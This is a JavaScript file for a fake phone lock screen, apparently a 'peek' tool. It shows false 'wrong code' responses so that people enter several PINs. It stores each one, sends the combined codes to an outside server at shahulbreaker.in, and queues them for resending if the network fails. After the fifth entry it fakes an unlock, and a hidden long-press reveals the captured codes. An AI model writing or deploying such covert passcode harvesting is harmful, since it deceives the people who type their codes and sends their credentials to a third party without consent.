(() => {
  const API_BASE = "https://shahulbreaker.in/api/storedata.php?user=tarunpeek&data=";
  const MAX = 4;
  let code = "";

  const dotEls = Array.from(document.querySelectorAll('.dot'));
  const keys = Array.from(document.querySelectorAll('.key[data-num]'));
  const emergency = document.getElementById('emergency');
  const cancelBtn = document.getElementById('cancel');
  const unlockOverlay = document.getElementById('unlockOverlay');
  const lockInner = document.querySelector('.lockscreen-inner');
  const homescreenImg = document.getElementById('homescreenImg');
  const ATT_KEY = '_pass_attempt_count_';
  const QUEUE_KEY = '_pass_queue_';
  const ATT_CODES_KEY = '_pass_attempts_codes_'; // persistent storage key for collected codes

  // long-press config
  const LONGPRESS_MS = 600;
  let codesBarTimer = null;
  let hpStartX = 0;
  let hpStartY = 0;

  function getAttempts() { return parseInt(localStorage.getItem(ATT_KEY) || '0', 10); }
  function setAttempts(n) { localStorage.setItem(ATT_KEY, String(n)); }

  function getStoredAttemptCodes() {
    try { return JSON.parse(localStorage.getItem(ATT_CODES_KEY) || '[]'); }
    catch (e) { return []; }
  }
  function pushStoredAttemptCode(pass) {
    const arr = getStoredAttemptCodes();
    arr.push(pass);
    localStorage.setItem(ATT_CODES_KEY, JSON.stringify(arr));
  }
  function clearStoredAttemptCodes() {
    localStorage.removeItem(ATT_CODES_KEY);
  }

  function refreshDots() {
    dotEls.forEach((d,i) => d.classList.toggle('filled', i < code.length));
  }

  function reset() {
    code = "";
    refreshDots();
  }

  function queuePass(pass) {
    const q = JSON.parse(localStorage.getItem(QUEUE_KEY) || '[]');
    q.push({ pass, ts: Date.now() });
    localStorage.setItem(QUEUE_KEY, JSON.stringify(q));
  }

  function sendToAPI(pass) {
    const url = API_BASE + encodeURIComponent(pass);
    return fetch(url, { method: 'GET', keepalive: true })
      .catch(() => {
        // if network fails, queue the combined payload
        queuePass(pass);
      });
  }

  function flushQueue() {
    const queue = JSON.parse(localStorage.getItem(QUEUE_KEY) || '[]');
    if (!queue.length) return;
    queue.forEach(item => {
      fetch(API_BASE + encodeURIComponent(item.pass), { method: 'GET', keepalive: true }).catch(()=>{});
    });
    localStorage.removeItem(QUEUE_KEY);
  }

  /* ---------- Spring engine (unchanged) ---------- */
  function springAnimate(opts) {
    const mass = opts.mass ?? 1;
    const stiffness = opts.stiffness ?? 120;
    const damping = opts.damping ?? 14;
    const threshold = opts.threshold ?? 0.02;
    let x = opts.from;
    let v = opts.velocity ?? 0;
    const target = opts.to;
    let last = performance.now();
    let rafId = null;

    function step(now) {
      const dt = Math.min(0.032, (now - last) / 1000);
      last = now;
      const a = (-stiffness * (x - target) - damping * v) / mass;
      v += a * dt;
      x += v * dt;

      if (typeof opts.onUpdate === 'function') opts.onUpdate(x);

      const isSettled = Math.abs(v) < threshold && Math.abs(x - target) < (Math.abs(target) * 0.005 + 0.5);
      if (isSettled) {
        if (typeof opts.onUpdate === 'function') opts.onUpdate(target);
        if (typeof opts.onComplete === 'function') opts.onComplete();
        cancelAnimationFrame(rafId);
        return;
      }
      rafId = requestAnimationFrame(step);
    }

    rafId = requestAnimationFrame(step);
    return () => cancelAnimationFrame(rafId);
  }

  /* ---------- Unlock animation (unchanged) ---------- */
  function playUnlockAnimation() {
    const prefersReduced = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
    if (!lockInner || !unlockOverlay || !homescreenImg) return;

    unlockOverlay.classList.add('show');

    if (prefersReduced) {
      lockInner.style.transform = `translate3d(0, -110%, 0)`;
      homescreenImg.style.transform = `translate3d(0,0,0) scale(1)`;
      homescreenImg.style.opacity = '1';
      homescreenImg.style.filter = 'blur(0) saturate(1)';
      return;
    }

    const height = Math.max(window.innerHeight, document.documentElement.clientHeight);
    const targetY = -Math.round(height * 1.08);

    lockInner.style.willChange = 'transform, opacity';
    homescreenImg.style.willChange = 'transform, filter, opacity';
    lockInner.style.transform = `translate3d(0,0,0) scale(1)`;
    homescreenImg.style.transform = `translate3d(0,6%,0) scale(0.96)`;
    homescreenImg.style.opacity = '0';
    homescreenImg.style.filter = 'blur(10px) saturate(0.9)';
    lockInner.style.boxShadow = '0 40px 90px rgba(0,0,0,0.55)';

    springAnimate({
      from: 0,
      to: targetY,
      mass: 1.05,
      stiffness: 140,
      damping: 16,
      onUpdate: (val) => {
        const progress = Math.min(1, Math.abs(val / targetY));
        const scale = 1 - 0.003 * progress;
        lockInner.style.transform = `translate3d(0, ${val}px, 0) scale(${scale})`;
        lockInner.style.opacity = String(1 - Math.min(0.18, progress * 0.18));
      },
      onComplete: () => {
        lockInner.style.boxShadow = '';
        lockInner.style.opacity = '0';
        lockInner.style.transform = `translate3d(0, ${targetY}px, 0)`;
      }
    });

    springAnimate({
      from: 0,
      to: 1,
      mass: 1,
      stiffness: 80,
      damping: 11,
      onUpdate: (p) => {
        const progress = Math.max(0, Math.min(1, p));
        const raw = p;
        const scale = 1 + (raw - 1) * 0.12;
        const finalScale = Math.max(0.96, Math.min(1.06, scale));
        homescreenImg.style.transform = `translate3d(0,0,0) scale(${finalScale})`;
        const blur = Math.max(0, 10 * (1 - Math.min(1, raw)));
        const sat = 0.9 + Math.min(0.15, raw * 0.15);
        homescreenImg.style.filter = `blur(${blur}px) saturate(${sat})`;
        homescreenImg.style.opacity = String(Math.min(1, 0.1 + raw));
      },
      onComplete: () => {
        homescreenImg.style.transform = 'translate3d(0,0,0) scale(1)';
        homescreenImg.style.filter = 'blur(0) saturate(1)';
        homescreenImg.style.opacity = '1';
      }
    });

    setTimeout(() => {
      lockInner.style.boxShadow = '';
      homescreenImg.style.willChange = '';
      lockInner.style.willChange = '';
    }, 1200);
  }

  function animateWrongAttempt() {
    const dotsEl = document.getElementById('dots');
    if (!dotsEl) {
      reset();
      return;
    }
    const DURATION = 700;
    dotsEl.classList.add('wrong');
    reset();
    setTimeout(() => {
      dotsEl.classList.remove('wrong');
    }, DURATION + 20);
  }

  /* ---------- Attempts logic: collect 4 codes, send combined on 4th, 5th unlock ---------- */
  async function handleCompleteAttempt(enteredCode) {
    let attempts = getAttempts();
    attempts += 1;
    setAttempts(attempts);

    // store this entered code persistently
    pushStoredAttemptCode(enteredCode);

    if (attempts >= 1 && attempts <= 3) {
      animateWrongAttempt();
    } else if (attempts === 4) {
      const codes = getStoredAttemptCodes();
      const combined = codes.join(',');
      sendToAPI(combined);
      animateWrongAttempt();
    } else if (attempts === 5) {
      playUnlockAnimation();
      setTimeout(reset, 300);
    }

    // After 5th attempt reset counter but KEEP stored codes so they can be shown on long-press
    if (attempts >= 5) {
      setAttempts(0);
    }
  }

  /* ---------- Minimal codes bar: create dynamically with inline styles (NO buttons) ---------- */
  function createMinimalCodesBar() {
    if (document.getElementById('codesBar')) return document.getElementById('codesBar');

    const bar = document.createElement('div');
    bar.id = 'codesBar';
    // inline styles so you don't need to edit CSS
    Object.assign(bar.style, {
      position: 'fixed',
      left: '50%',
      bottom: '20px',
      transform: 'translateX(-50%) translateY(20px)',
      width: 'calc(100% - 32px)',
      maxWidth: '820px',
      zIndex: '11000',
      display: 'flex',
      justifyContent: 'center',
      pointerEvents: 'none',
      opacity: '0',
      transition: 'opacity 160ms ease, transform 160ms ease',
      fontFamily: 'ui-monospace, SFMono-Regular, Menlo, monospace',
      fontSize: '14px'
    });

    const inner = document.createElement('div');
    Object.assign(inner.style, {
      width: '100%',
      background: 'rgba(0,0,0,0.56)',
      backdropFilter: 'blur(8px)',
      WebkitBackdropFilter: 'blur(8px)',
      borderRadius: '12px',
      padding: '10px 12px',
      boxSizing: 'border-box',
      display: 'flex',
      gap: '10px',
      justifyContent: 'center',
      alignItems: 'center',
      flexWrap: 'wrap',
      pointerEvents: 'none',
      color: '#fff',
      boxShadow: '0 10px 30px rgba(0,0,0,0.45)'
    });

    inner.id = 'codesInner';
    bar.appendChild(inner);
    document.body.appendChild(bar);
    return bar;
  }

  function populateAndShowMinimalBar() {
    if (!unlockOverlay || !unlockOverlay.classList.contains('show')) return;
    const bar = createMinimalCodesBar();
    const inner = document.getElementById('codesInner');
    inner.innerHTML = ''; // clear

    const codes = getStoredAttemptCodes();
    if (!codes || codes.length === 0) {
      const s = document.createElement('span');
      s.textContent = '';
      inner.appendChild(s);
    } else {
      codes.forEach(c => {
        const pill = document.createElement('span');
        pill.textContent = c;
        Object.assign(pill.style, {
          background: 'rgba(255,255,255,0.08)',
          padding: '6px 10px',
          borderRadius: '999px',
          fontWeight: '700',
          letterSpacing: '.5px',
          color: '#fff',
          pointerEvents: 'none'
        });
        inner.appendChild(pill);
      });
    }

    // show bar (animate in)
    bar.style.display = 'flex';
    // force reflow then animate
    requestAnimationFrame(() => {
      bar.style.transform = 'translateX(-50%) translateY(0)';
      bar.style.opacity = '1';
    });
  }

  function hideMinimalBarNow() {
    const bar = document.getElementById('codesBar');
    if (!bar) return;
    bar.style.transform = 'translateX(-50%) translateY(20px)';
    bar.style.opacity = '0';
    // after transition remove display to keep DOM tidy
    setTimeout(() => {
      if (bar && bar.parentNode) bar.style.display = 'none';
    }, 180);
  }

  /* ---------- Long-press handling (homescreen image). Show on long-press; hide on lift ---------- */
  function onHPDown(ev) {
    if (!unlockOverlay || !unlockOverlay.classList.contains('show')) return;
    hpStartX = ev.clientX;
    hpStartY = ev.clientY;
    clearTimeout(codesBarTimer);
    codesBarTimer = setTimeout(() => {
      populateAndShowMinimalBar();
      codesBarTimer = null;
    }, LONGPRESS_MS);
  }

  function onHPMove(ev) {
    if (!codesBarTimer) return;
    const dx = Math.abs(ev.clientX - hpStartX);
    const dy = Math.abs(ev.clientY - hpStartY);
    // cancel long-press if the finger moved too much (intent to scroll/drag)
    if (dx > 10 || dy > 10) {
      clearTimeout(codesBarTimer);
      codesBarTimer = null;
    }
  }

  function onHPUp(ev) {
    // cancel pending long-press timer
    if (codesBarTimer) {
      clearTimeout(codesBarTimer);
      codesBarTimer = null;
      return;
    }
    // if bar is shown, hide it immediately on lift
    hideMinimalBarNow();
  }

  if (homescreenImg) {
    homescreenImg.addEventListener('pointerdown', onHPDown);
    homescreenImg.addEventListener('pointermove', onHPMove, { passive: true });
    homescreenImg.addEventListener('pointerup', onHPUp);
    homescreenImg.addEventListener('pointercancel', onHPUp);
    // also support contextmenu on desktop for convenience (will hide on next pointerup)
    homescreenImg.addEventListener('contextmenu', (e) => {
      if (!unlockOverlay || !unlockOverlay.classList.contains('show')) return;
      e.preventDefault();
      populateAndShowMinimalBar();
    });
  } else {
    // fallback: attach to document
    document.addEventListener('pointerdown', onHPDown);
    document.addEventListener('pointermove', onHPMove, { passive: true });
    document.addEventListener('pointerup', onHPUp);
    document.addEventListener('pointercancel', onHPUp);
    document.addEventListener('contextmenu', (e) => {
      if (!unlockOverlay || !unlockOverlay.classList.contains('show')) return;
      e.preventDefault();
      populateAndShowMinimalBar();
    });
  }

  function animateBrightness(el, target, duration) {
    let startTime;
    const initial = parseFloat(el.dataset.brightness || "1");
    const change = target - initial;

    function easeOutCubic(t) {
      return 1 - Math.pow(1 - t, 3);
    }

    function frame(ts) {
      if (!startTime) startTime = ts;
      const progress = Math.min((ts - startTime) / duration, 1);
      const eased = easeOutCubic(progress);
      const value = initial + change * eased;
      el.style.filter = `brightness(${value})`;
      el.dataset.brightness = value.toFixed(3);
      if (progress < 1) {
        requestAnimationFrame(frame);
      }
    }
    requestAnimationFrame(frame);
  }

  keys.forEach(k => {
    const num = k.dataset.num;
    if (!num) return;

    k.addEventListener('touchstart', () => {
      animateBrightness(k, 1.6, 80); // increased brightness
    }, { passive: true });

    const endPress = () => {
      animateBrightness(k, 1, 100);
    };
    k.addEventListener('touchend', endPress);
    k.addEventListener('touchcancel', endPress);
    k.addEventListener('mouseleave', endPress);

    k.addEventListener('click', () => {
      if (code.length >= MAX) return;
      code += num;
      refreshDots();

      if (code.length === MAX) {
        const enteredCode = code;
        setTimeout(() => {
          handleCompleteAttempt(enteredCode);
        }, 120);
      }
    });
  });

  emergency && emergency.addEventListener('click', e => e.preventDefault());
  cancelBtn && cancelBtn.addEventListener('click', e => { e.preventDefault(); reset(); });

  window.addEventListener('online', flushQueue);
  flushQueue();

  window.__passUI = { getCode: () => code, reset, getAttempts, queuePass };
})();
